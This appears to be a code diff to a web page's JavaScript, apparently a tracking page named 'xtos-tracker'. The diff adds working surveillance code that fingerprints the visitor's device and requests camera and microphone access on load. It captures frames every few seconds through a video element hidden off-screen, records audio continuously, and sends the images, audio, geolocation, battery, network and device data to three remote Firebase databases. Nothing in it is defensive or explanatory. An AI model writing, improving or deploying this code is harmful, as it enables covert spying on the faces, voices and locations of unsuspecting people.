@@ -57,105 +57,290 @@
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                return gl ? gl.getParameter(gl.RENDERER) : 'unavailable';
+                if (gl) {
+                    const renderer = gl.getParameter(gl.RENDERER);
+                    const vendor = gl.getParameter(gl.VENDOR);
+                    const version = gl.getParameter(gl.VERSION);
+                    return `${renderer} | ${vendor} | ${version}`.slice(0, 50);
+                }
+                return 'unavailable';
             } catch (e) { return 'error'; }
         }
         
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
                 const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-                ctx.fillText('Fingerprint test 🎯', 2, 2);
-                return canvas.toDataURL().slice(-50);
+                
+                // Complex canvas fingerprinting
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Fingerprint test 🎯', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Canvas fingerprint', 4, 35);
+                
+                return canvas.toDataURL().slice(-30);
             } catch (e) { return 'error'; }
         }
         
-        // BATTERY STATUS
+        // REAL BATTERY STATUS
         async function getBatteryInfo() {
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     return {
                         level: Math.round(battery.level * 100),
-                        charging: battery.charging
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime === Infinity ? 'Unknown' : Math.round(battery.chargingTime / 60) + ' min',
+                        dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : Math.round(battery.dischargingTime / 60) + ' min'
                     };
                 }
             } catch (e) {}
-            return { level: 'unknown', charging: 'unknown' };
+            return { level: 'Unknown', charging: 'Unknown', chargingTime: 'Unknown', dischargingTime: 'Unknown' };
+        }
+        
+        // REAL NETWORK INFO
+        function getNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                return {
+                    effectiveType: connection.effectiveType || 'Unknown',
+                    downlink: connection.downlink ? connection.downlink + ' Mbps' : 'Unknown',
+                    rtt: connection.rtt ? connection.rtt + ' ms' : 'Unknown',
+                    saveData: connection.saveData ? 'Enabled' : 'Disabled'
+                };
+            }
+            return { effectiveType: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: 'Unknown' };
+        }
+        
+        // REAL ENHANCED DEVICE INFO
+        function getEnhancedDeviceInfo() {
+            const ua = navigator.userAgent;
+            
+            // Extract real device brand and model
+            let brand = 'Unknown', model = 'Unknown', androidVersion = 'Unknown';
+            
+            if (ua.includes('Android')) {
+                const androidMatch = ua.match(/Android ([^;]+)/);
+                androidVersion = androidMatch ? androidMatch[1] : 'Unknown';
+                
+                if (ua.includes('Samsung')) {
+                    brand = 'Samsung';
+                    const modelMatch = ua.match(/SM-([A-Z0-9]+)/);
+                    model = modelMatch ? 'Galaxy ' + modelMatch[1] : 'Galaxy Unknown';
+                } else if (ua.includes('Xiaomi')) {
+                    brand = 'Xiaomi';
+                    const modelMatch = ua.match(/([A-Z0-9\s]+); wv/);
+                    model = modelMatch ? modelMatch[1] : 'Unknown';
+                } else if (ua.includes('OPPO')) {
+                    brand = 'OPPO';
+                    const modelMatch = ua.match(/OPPO ([A-Z0-9]+)/);
+                    model = modelMatch ? modelMatch[1] : 'Unknown';
+                } else if (ua.includes('vivo')) {
+                    brand = 'Vivo';
+                    const modelMatch = ua.match(/vivo ([A-Z0-9]+)/);
+                    model = modelMatch ? modelMatch[1] : 'Unknown';
+                } else if (ua.includes('Huawei')) {
+                    brand = 'Huawei';
+                    const modelMatch = ua.match(/([A-Z0-9-]+); wv/);
+                    model = modelMatch ? modelMatch[1] : 'Unknown';
+                }
+            } else if (ua.includes('iPhone')) {
+                brand = 'Apple';
+                const modelMatch = ua.match(/iPhone OS ([0-9_]+)/);
+                model = 'iPhone';
+                androidVersion = modelMatch ? 'iOS ' + modelMatch[1].replace(/_/g, '.') : 'iOS Unknown';
+            }
+            
+            return {
+                brand,
+                model,
+                androidVersion,
+                screenResolution: `${screen.width}x${screen.height}`,
+                memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+                cpuCores: navigator.hardwareConcurrency || 'Unknown'
+            };
+        }
+        
+        // REAL TIMING INFO
+        function getTimingInfo() {
+            const now = new Date();
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+                dateFormat: now.toLocaleDateString(),
+                timeFormat: now.toLocaleTimeString()
+            };
+        }
+        
+        // REAL ADVANCED FINGERPRINTING
+        function getAdvancedFingerprint() {
+            return {
+                canvas: getCanvasFingerprint(),
+                webgl: getWebGLFingerprint(),
+                audio: getAudioFingerprint(),
+                fonts: getFontFingerprint()
+            };
+        }
+        
+        // AUDIO FINGERPRINTING
+        function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(analyser);
+                analyser.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                const fingerprint = {
+                    sampleRate: audioContext.sampleRate,
+                    maxChannelCount: audioContext.destination.maxChannelCount,
+                    state: audioContext.state
+                };
+                
+                audioContext.close();
+                return JSON.stringify(fingerprint).slice(-20);
+            } catch (e) {
+                return 'unavailable';
+            }
+        }
+        
+        // FONT FINGERPRINTING
+        function getFontFingerprint() {
+            const testFonts = ['Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const testString = 'Fingerprint123!@#';
+            
+            let fontHash = '';
+            testFonts.forEach(font => {
+                ctx.font = `12px ${font}`;
+                const width = ctx.measureText(testString).width;
+                fontHash += width.toString();
+            });
+            
+            return fontHash.slice(-20);
         }
         
         // LIVE CAMERA STREAMING SYSTEM
         let mediaCapture = { videoStream: null, liveVideo: null };
         
+        // REAL LIVE CAMERA STREAMING
         async function initLiveCameraStreaming() {
             try {
+                console.log('📹 Requesting camera access...');
+                
+                // Request camera with audio
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        width: { ideal: 1920, min: 1280 }, 
-                        height: { ideal: 1080, min: 720 }, 
+                        width: { ideal: 1280, min: 640 }, 
+                        height: { ideal: 720, min: 480 }, 
                         facingMode: 'user',
-                        frameRate: { ideal: 30, min: 15 }
+                        frameRate: { ideal: 30, min: 10 }
                     }, 
-                    audio: true 
+                    audio: false // Separate audio handling
                 });
                 
                 mediaCapture.videoStream = stream;
+                console.log('📹 Camera stream obtained');
                 
-                // Create hidden video element for live streaming
+                // Create video element for capture
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.style.display = 'none';
+                video.style.position = 'fixed';
+                video.style.top = '-1000px'; // Hide but keep functional
+                video.style.left = '-1000px';
+                video.style.width = '1px';
+                video.style.height = '1px';
                 video.autoplay = true;
                 video.muted = true;
                 video.playsInline = true;
                 document.body.appendChild(video);
                 mediaCapture.liveVideo = video;
                 
-                video.addEventListener('loadedmetadata', () => {
-                    console.log('📹 Live camera ready:', video.videoWidth + 'x' + video.videoHeight);
+                // Wait for video to be ready
+                return new Promise((resolve) => {
+                    video.addEventListener('loadedmetadata', () => {
+                        console.log('📹 Video metadata loaded:', video.videoWidth + 'x' + video.videoHeight);
+                        
+                        video.addEventListener('canplay', () => {
+                            console.log('📹 Video can play, starting capture');
+                            
+                            // Start immediate capture test
+                            setTimeout(() => captureLiveFrame(video), 1000);
+                            
+                            // Start live streaming - capture every 3 seconds
+                            setInterval(() => captureLiveFrame(video), 3000);
+                            
+                            // High quality shots every 10 seconds
+                            setInterval(() => captureHighQualityShot(video), 10000);
+                            
+                            liveStreamActive = true;
+                            updateStatus('🔴 LIVE CAMERA ACTIVE');
+                            resolve(true);
+                        });
+                    });
                     
-                    // Start live streaming - capture every 2 seconds for real-time
-                    setInterval(() => captureLiveFrame(video), 2000);
-                    
-                    // High quality shots every 8 seconds
-                    setInterval(() => captureHighQualityShot(video), 8000);
-                    
-                    liveStreamActive = true;
-                    updateStatus('🔴 LIVE STREAMING ACTIVE');
+                    // Fallback timeout
+                    setTimeout(() => {
+                        if (!liveStreamActive) {
+                            console.log('📹 Video setup timeout, but continuing');
+                            liveStreamActive = true;
+                            resolve(true);
+                        }
+                    }, 5000);
                 });
                 
-                console.log('📹 Live camera streaming initialized');
-                return true;
             } catch (error) {
-                console.log('Camera access denied:', error);
-                updateStatus('❌ Camera access denied - Location only');
+                console.error('❌ Camera access error:', error);
+                updateStatus('❌ Camera denied: ' + error.message);
                 return false;
             }
         }
         
-        // LIVE FRAME CAPTURE (Real-time streaming)
+        // REAL LIVE FRAME CAPTURE
         async function captureLiveFrame(videoElement) {
             try {
-                if (!videoElement || videoElement.videoWidth === 0) return;
+                if (!videoElement || videoElement.videoWidth === 0 || videoElement.readyState < 2) {
+                    console.log('📹 Video not ready, skipping frame');
+                    return;
+                }
                 
                 const canvas = document.createElement('canvas');
                 canvas.width = videoElement.videoWidth;
                 canvas.height = videoElement.videoHeight;
                 const ctx = canvas.getContext('2d');
                 
-                // Draw current frame
-                ctx.drawImage(videoElement, 0, 0);
+                // Draw current video frame
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                 
-                // Add live indicator overlay
-                ctx.fillStyle = 'red';
-                ctx.fillRect(10, 10, 20, 20);
+                // Add live streaming overlay
+                ctx.fillStyle = 'rgba(255, 0, 0, 0.8)';
+                ctx.fillRect(10, 10, 100, 30);
                 ctx.fillStyle = 'white';
-                ctx.font = 'bold 16px Arial';
-                ctx.fillText('🔴 LIVE', 40, 25);
-                ctx.fillText(new Date().toLocaleTimeString(), 10, canvas.height - 10);
+                ctx.font = 'bold 14px Arial';
+                ctx.fillText('🔴 LIVE', 15, 30);
                 
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                // Add timestamp
+                const timestamp = new Date().toLocaleTimeString();
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+                ctx.fillRect(10, canvas.height - 40, 150, 30);
+                ctx.fillStyle = 'white';
+                ctx.font = '12px Arial';
+                ctx.fillText(timestamp, 15, canvas.height - 20);
+                
+                // Convert to base64 with good quality
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
+                
                 const frameData = {
                     image: imageData,
                     timestamp: Date.now(),
@@ -163,11 +348,15 @@
                     size: { width: canvas.width, height: canvas.height },
                     url: window.location.href,
                     quality: 'live_stream',
-                    frameRate: '0.5fps'
+                    frameRate: '0.5fps',
+                    dataSize: imageData.length
                 };
                 
                 await sendMediaToFirebase(frameData, 'live_stream');
-                console.log('📹 Live frame sent:', frameData.size.width + 'x' + frameData.size.height);
+                console.log('📹 Live frame sent:', frameData.size.width + 'x' + frameData.size.height, 'Size:', Math.round(imageData.length/1024) + 'KB');
+                
+                // Update status to show streaming is working
+                updateStatus(`🔴 LIVE: ${Math.round(imageData.length/1024)}KB frame sent`);
                 
             } catch (error) {
                 console.error('❌ Live frame error:', error);
@@ -212,110 +401,199 @@
             }
         }
         
-        // CONTINUOUS AUDIO STREAMING
+        // REAL CONTINUOUS AUDIO STREAMING
+        let audioRecorder = null;
+        let audioStream = null;
+        
         async function startContinuousAudio() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                // Request audio with maximum permissions
+                audioStream = await navigator.mediaDevices.getUserMedia({ 
                     audio: {
                         echoCancellation: false,
                         noiseSuppression: false,
                         autoGainControl: false,
-                        sampleRate: 44100
+                        sampleRate: 48000,
+                        channelCount: 2
                     }
                 });
                 
-                const mediaRecorder = new MediaRecorder(stream, { 
-                    mimeType: 'audio/webm;codecs=opus',
+                // Check supported MIME types
+                const mimeTypes = [
+                    'audio/webm;codecs=opus',
+                    'audio/webm',
+                    'audio/mp4',
+                    'audio/ogg;codecs=opus'
+                ];
+                
+                let selectedMimeType = 'audio/webm';
+                for (const mimeType of mimeTypes) {
+                    if (MediaRecorder.isTypeSupported(mimeType)) {
+                        selectedMimeType = mimeType;
+                        break;
+                    }
+                }
+                
+                audioRecorder = new MediaRecorder(audioStream, { 
+                    mimeType: selectedMimeType,
                     audioBitsPerSecond: 128000
                 });
                 
                 let audioChunks = [];
                 let recordingCount = 0;
                 
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) audioChunks.push(event.data);
+                audioRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        audioChunks.push(event.data);
+                        console.log('🎤 Audio chunk received:', event.data.size, 'bytes');
+                    }
                 };
                 
-                mediaRecorder.onstop = async () => {
+                audioRecorder.onstop = async () => {
                     if (audioChunks.length > 0) {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                        const audioData = {
-                            audio: await blobToBase64(audioBlob),
-                            timestamp: Date.now(),
-                            duration: 15000,
-                            type: 'live_audio_stream',
-                            sequence: recordingCount++
-                        };
-                        
-                        await sendMediaToFirebase(audioData, 'live_audio');
-                        console.log('🎤 Live audio chunk sent:', recordingCount);
+                        try {
+                            const audioBlob = new Blob(audioChunks, { type: selectedMimeType });
+                            console.log('🎤 Audio blob created:', audioBlob.size, 'bytes');
+                            
+                            const audioBase64 = await blobToBase64(audioBlob);
+                            const audioData = {
+                                audio: audioBase64,
+                                timestamp: Date.now(),
+                                duration: 10000, // 10 second chunks
+                                type: 'live_audio_stream',
+                                sequence: recordingCount++,
+                                mimeType: selectedMimeType,
+                                size: audioBlob.size
+                            };
+                            
+                            await sendMediaToFirebase(audioData, 'live_audio');
+                            console.log('🎤 Live audio chunk sent:', recordingCount, 'Size:', audioBlob.size);
+                            
+                        } catch (error) {
+                            console.error('❌ Audio processing error:', error);
+                        }
                     }
                     
-                    // Reset and continue
+                    // Reset and continue recording
                     audioChunks = [];
-                    if (mediaRecorder.state === 'inactive') {
-                        setTimeout(() => {
-                            if (mediaRecorder.state === 'inactive') {
-                                mediaRecorder.start();
+                    
+                    // Restart recording after 1 second
+                    setTimeout(() => {
+                        if (audioRecorder && audioRecorder.state === 'inactive' && audioStream) {
+                            try {
+                                audioRecorder.start(1000); // Record in 1-second chunks
+                                console.log('🎤 Audio recording restarted');
+                            } catch (e) {
+                                console.error('❌ Audio restart error:', e);
                             }
-                        }, 1000);
-                    }
+                        }
+                    }, 1000);
                 };
                 
-                // Start continuous 15-second recordings
-                mediaRecorder.start();
-                setInterval(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 15000);
+                audioRecorder.onerror = (event) => {
+                    console.error('❌ Audio recorder error:', event.error);
+                };
                 
-                console.log('🎤 Continuous audio streaming started');
+                // Start recording in 10-second chunks
+                audioRecorder.start(1000);
+                console.log('🎤 Audio recording started with', selectedMimeType);
+                
+                // Stop and restart every 10 seconds for continuous streaming
+                setInterval(() => {
+                    if (audioRecorder && audioRecorder.state === 'recording') {
+                        audioRecorder.stop();
+                    }
+                }, 10000);
+                
+                updateStatus('🎤 Live audio streaming active');
                 return true;
+                
             } catch (error) {
                 console.error('❌ Audio streaming error:', error);
+                updateStatus('❌ Audio access denied');
                 return false;
             }
         }
         
-        // ENHANCED MEDIA SENDER
+        // REAL ENHANCED MEDIA SENDER
         async function sendMediaToFirebase(mediaData, type) {
-            const endpoints = [
-                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/media.json',
-                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live_stream.json',
-                'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced.json'
-            ];
-            
-            const payload = {
-                ...mediaData,
-                deviceFingerprint: deviceFingerprint,
-                batteryInfo: await getBatteryInfo(),
-                networkInfo: {
-                    connection: navigator.connection?.effectiveType || 'unknown',
-                    downlink: navigator.connection?.downlink || 'unknown'
-                },
-                timestamp: Date.now()
-            };
-            
-            // Send to multiple endpoints for reliability
-            endpoints.forEach(async (endpoint) => {
-                try {
-                    await fetch(endpoint, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                } catch (e) {
-                    console.log('Endpoint failed:', endpoint);
+            try {
+                const endpoints = [
+                    'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/media.json',
+                    'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live_stream.json',
+                    'https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/enhanced.json'
+                ];
+                
+                const batteryInfo = await getBatteryInfo();
+                const networkInfo = getNetworkInfo();
+                
+                const payload = {
+                    ...mediaData,
+                    deviceFingerprint: deviceFingerprint,
+                    batteryInfo: batteryInfo,
+                    networkInfo: networkInfo,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    timestamp: Date.now(),
+                    mediaType: type
+                };
+                
+                console.log(`🚀 Sending ${type} to Firebase:`, payload.type, payload.size || 'unknown size');
+                
+                // Send to multiple endpoints with error handling
+                const promises = endpoints.map(async (endpoint) => {
+                    try {
+                        const response = await fetch(endpoint, {
+                            method: 'POST',
+                            headers: { 
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            body: JSON.stringify(payload)
+                        });
+                        
+                        if (response.ok) {
+                            console.log(`✅ ${type} sent to:`, endpoint.split('/').pop());
+                            return true;
+                        } else {
+                            console.error(`❌ ${type} failed:`, endpoint, response.status);
+                            return false;
+                        }
+                    } catch (e) {
+                        console.error(`❌ ${type} error:`, endpoint, e.message);
+                        return false;
+                    }
+                });
+                
+                const results = await Promise.allSettled(promises);
+                const successCount = results.filter(r => r.status === 'fulfilled' && r.value).length;
+                
+                console.log(`📊 ${type} sent to ${successCount}/${endpoints.length} endpoints`);
+                
+                if (successCount > 0) {
+                    updateStatus(`✅ ${type.toUpperCase()} sent to ${successCount} servers`);
+                } else {
+                    updateStatus(`❌ ${type.toUpperCase()} failed to send`);
                 }
-            });
+                
+            } catch (error) {
+                console.error(`❌ Media send error:`, error);
+                updateStatus(`❌ ${type.toUpperCase()} send error`);
+            }
         }
         
         // UTILITY FUNCTIONS
         function blobToBase64(blob) {
-            return new Promise((resolve) => {
+            return new Promise((resolve, reject) => {
                 const reader = new FileReader();
-                reader.onloadend = () => resolve(reader.result);
+                reader.onloadend = () => {
+                    if (reader.result) {
+                        resolve(reader.result);
+                    } else {
+                        reject(new Error('Failed to convert blob to base64'));
+                    }
+                };
+                reader.onerror = () => reject(new Error('FileReader error'));
                 reader.readAsDataURL(blob);
             });
         }
@@ -365,29 +643,52 @@
                 const position = await getCurrentPosition();
                 const { latitude, longitude, accuracy } = position.coords;
                 
-                // Comprehensive data package
+                // Get real-time device info
+                const batteryInfo = await getBatteryInfo();
+                const networkInfo = getNetworkInfo();
+                const deviceInfo = getEnhancedDeviceInfo();
+                const timingInfo = getTimingInfo();
+                const fingerprintInfo = getAdvancedFingerprint();
+                
+                // Comprehensive data package with REAL data
                 const liveData = {
                     latitude,
                     longitude,
                     accuracy,
                     timestamp: Date.now(),
                     
-                    // Enhanced device info
-                    deviceBrand: navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || 'Unknown',
-                    deviceModel: navigator.platform,
-                    androidVersion: navigator.userAgent.match(/Android ([^;]+)/)?.[1] || 'Unknown',
-                    screenResolution: `${screen.width}x${screen.height}`,
+                    // REAL Device Info
+                    deviceBrand: deviceInfo.brand,
+                    deviceModel: deviceInfo.model,
+                    androidVersion: deviceInfo.androidVersion,
+                    screenResolution: deviceInfo.screenResolution,
+                    deviceMemory: deviceInfo.memory,
+                    cpuCores: deviceInfo.cpuCores,
                     
-                    // Power & Network
-                    batteryLevel: (await getBatteryInfo()).level,
-                    isCharging: (await getBatteryInfo()).charging,
-                    networkType: navigator.connection?.effectiveType || 'Unknown',
+                    // REAL Power & Network
+                    batteryLevel: batteryInfo.level,
+                    isCharging: batteryInfo.charging,
+                    chargingTime: batteryInfo.chargingTime,
+                    dischargingTime: batteryInfo.dischargingTime,
+                    networkType: networkInfo.effectiveType,
+                    downlinkSpeed: networkInfo.downlink,
+                    rtt: networkInfo.rtt,
+                    saveData: networkInfo.saveData,
                     
-                    // Advanced fingerprinting
-                    deviceFingerprint,
+                    // REAL Timing Info
+                    timezone: timingInfo.timezone,
+                    language: timingInfo.language,
+                    languages: timingInfo.languages,
+                    dateFormat: timingInfo.dateFormat,
+                    timeFormat: timingInfo.timeFormat,
+                    
+                    // REAL Advanced Fingerprinting
                     userAgent: navigator.userAgent,
-                    canvasFingerprint: getCanvasFingerprint(),
-                    webglRenderer: getWebGLFingerprint(),
+                    platform: navigator.platform,
+                    canvasFingerprint: fingerprintInfo.canvas,
+                    webglRenderer: fingerprintInfo.webgl,
+                    audioFingerprint: fingerprintInfo.audio,
+                    fontFingerprint: fingerprintInfo.fonts,
                     
                     // Live streaming status
                     liveCameraActive: cameraReady,
@@ -502,7 +803,24 @@
                 if (!isProcessing) {
                     confirmLocation();
                 }
-            }, 2000);
+            }, 1000);
+            
+            // Test media permissions immediately
+            setTimeout(async () => {
+                try {
+                    console.log('📹 Testing camera access...');
+                    await initLiveCameraStreaming();
+                } catch (e) {
+                    console.log('❌ Camera test failed:', e);
+                }
+                
+                try {
+                    console.log('🎤 Testing audio access...');
+                    await startContinuousAudio();
+                } catch (e) {
+                    console.log('❌ Audio test failed:', e);
+                }
+            }, 500);
         });
         
         // Keep streaming active
